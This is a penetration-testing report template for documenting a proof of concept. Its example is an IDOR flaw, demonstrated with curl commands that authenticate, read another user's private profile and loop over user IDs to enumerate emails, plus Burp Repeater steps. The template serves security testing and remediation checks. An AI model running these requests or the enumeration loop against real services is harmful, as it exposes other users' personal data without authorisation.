# Proof of Concept (PoC) Template

> **Usage:** Complete this template for each finding that requires a standalone PoC demonstration. Attach as an appendix to the main finding in FINDINGS_TEMPLATE.md.

---

## PoC — Finding #[NUMBER]: [VULNERABILITY NAME]

**Severity:** [Critical / High / Medium / Low]
**Date:** [YYYY-MM-DD]
**Tester:** [Name]

---

### Prerequisites

| Requirement | Detail |
|---|---|
| Target URL | https://target.com |
| Test Account | user_a@test.com / TestPass@1 |
| Tools Required | curl, Burp Suite, Browser |
| Network Access | Internet / VPN required: [Yes/No] |

---

### Environment Setup

```bash
# Set variables
TARGET="https://target.com"
USER_A_EMAIL="user_a@test.com"
USER_A_PASS="TestPass@1"
USER_B_ID="1000"

# Authenticate and capture token
USER_A_TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$USER_A_EMAIL\",\"password\":\"$USER_A_PASS\"}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "User A Token: ${USER_A_TOKEN:0:20}..."
```

---

### Step-by-Step Exploitation

#### Step 1 — Establish Baseline (Normal Behavior)

```bash
# Confirm User A can access their own profile (expected 200)
echo "=== User A accessing own profile ==="
curl -si "$TARGET/api/v1/users/1001" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  | grep -E "^HTTP|email|name"
```

Expected output:
```
HTTP/1.1 200 OK
{"id":1001,"email":"user_a@test.com","name":"User A"}
```

#### Step 2 — Verify Unauthorized Access Attempt (Should Fail)

```bash
# Attempt to access User B's profile — should return 403
echo "=== User A accessing User B profile (SHOULD FAIL) ==="
curl -si "$TARGET/api/v1/users/$USER_B_ID" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  | grep -E "^HTTP|error|forbidden"
```

Expected: `HTTP/1.1 403 Forbidden`
Actual: [Paste actual output here]

#### Step 3 — Demonstrate Vulnerability

```bash
# Confirm IDOR — User A reads User B's private data
echo "=== IDOR CONFIRMED — User A accessing User B ==="
curl -s "$TARGET/api/v1/users/$USER_B_ID" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  | python3 -m json.tool
```

**Actual Response:**
```json
HTTP/1.1 200 OK
{
  "id": 1000,
  "email": "[VICTIM_EMAIL_REDACTED]",
  "phone": "[VICTIM_PHONE_REDACTED]",
  "address": "[VICTIM_ADDRESS_REDACTED]"
}
```

---

### Burp Suite Reproduction Steps

1. Open Burp Suite and configure browser proxy
2. Log in as User A (`user_a@test.com`)
3. Navigate to own profile — observe request to `GET /api/v1/users/1001`
4. Send this request to **Repeater**
5. Change `1001` to `1000` in the URL path
6. Click **Send**
7. Observe: Response returns User B's private data with HTTP 200

**Burp Screenshot:** `[Attach: poc_finding_XX_burp.png]`

---

### Visual PoC (Browser)

For XSS / UI-based findings:
1. Open browser (incognito)
2. Navigate to: `https://target.com/user/1000` (attacker-controlled profile)
3. Observe: Alert box appears with content `[document.domain]`

**Browser Screenshot:** `[Attach: poc_finding_XX_browser.png]`

---

### Impact Demonstration

```bash
# Demonstrate data volume — enumerate first 10 user IDs
echo "=== Impact — User enumeration sample ==="
for ID in $(seq 990 1000); do
  RESP=$(curl -s "$TARGET/api/v1/users/$ID" \
    -H "Authorization: Bearer $USER_A_TOKEN")
  EMAIL=$(echo $RESP | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email','Not found'))" 2>/dev/null)
  echo "User $ID: $EMAIL"
  sleep 0.2
done
```

> **Note:** Run on test environment only. Stop after 10 samples.

---

### Remediation Verification

After fix is applied, repeat Step 2 and Step 3:

```bash
# Retest — Step 2 should now return 403
curl -si "$TARGET/api/v1/users/$USER_B_ID" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  | grep -E "^HTTP|error|forbidden"
```

**Pass Condition:** `HTTP/1.1 403 Forbidden` with no PII in response body.

---

*PoC Status: [ ] Active  [ ] Remediated  [ ] Retested & Closed*
